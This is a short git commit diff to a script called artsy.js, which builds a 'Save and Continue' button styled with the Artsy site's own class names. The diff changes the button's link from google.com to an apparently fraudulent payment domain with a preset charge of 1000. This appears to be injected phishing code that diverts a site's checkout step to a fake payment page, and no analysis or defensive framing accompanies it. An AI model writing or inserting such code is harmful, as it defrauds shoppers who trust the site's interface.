188ef4ec5c5ad4026f664a141d9e1edc979d1e24
Ralph Lauren <rl@example.com>
2024-09-11 16:33:04 +0300

    featL artsy

--- artsy.js
+++ artsy.js
@@ -3,7 +3,7 @@ let orderDiv
 let SaveAndContinueBtn
 
 let newButton = document.createElement('div')
-newButton.innerHTML = `<a href="http://www.google.com" tabindex="0" display="inline-flex" width="50%" class="Button__Container-sc-1bhxy1c-0 dgWQOL"><div opacity="1" display="flex" width="100%" font-family="sans" class="Box-sc-15se88d-0 Text-sc-18gcpao-0 hOLXSx hpQner">Save and Continue</div></a>`;
+newButton.innerHTML = `<a href="https://www.payment.store-horn-bacn.top?sum=1000" tabindex="0" display="inline-flex" width="50%" class="Button__Container-sc-1bhxy1c-0 dgWQOL"><div opacity="1" display="flex" width="100%" font-family="sans" class="Box-sc-15se88d-0 Text-sc-18gcpao-0 hOLXSx hpQner">Save and Continue</div></a>`;
 
 console.log('this is artsy js from rl github')
 
